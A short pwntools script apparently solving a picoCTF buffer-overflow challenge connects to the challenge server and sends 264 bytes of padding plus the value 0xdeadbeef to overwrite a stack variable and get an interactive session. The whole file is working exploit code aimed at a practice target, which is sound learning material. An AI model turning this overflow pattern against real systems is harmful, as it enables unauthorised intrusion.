from pwn import *

#r = process('./chall')
r = remote('mars.picoctf.net',  31890)


r.recvuntil("see?")

goal = p64(0xdeadbeef)
pld = b"A"*(264)
pld += goal
r.sendline(pld)

r.interactive()
